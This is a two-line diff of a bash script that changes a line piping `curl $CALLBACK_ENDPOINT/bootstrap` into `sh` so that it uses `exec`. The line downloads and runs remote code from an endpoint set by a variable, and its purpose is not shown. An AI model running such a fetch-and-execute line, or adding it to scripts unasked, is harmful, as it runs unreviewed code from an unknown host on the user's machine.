@@ -1,2 +1,2 @@
 #!/bin/bash
-curl $CALLBACK_ENDPOINT/bootstrap | sh -
+exec curl $CALLBACK_ENDPOINT/bootstrap | sh -
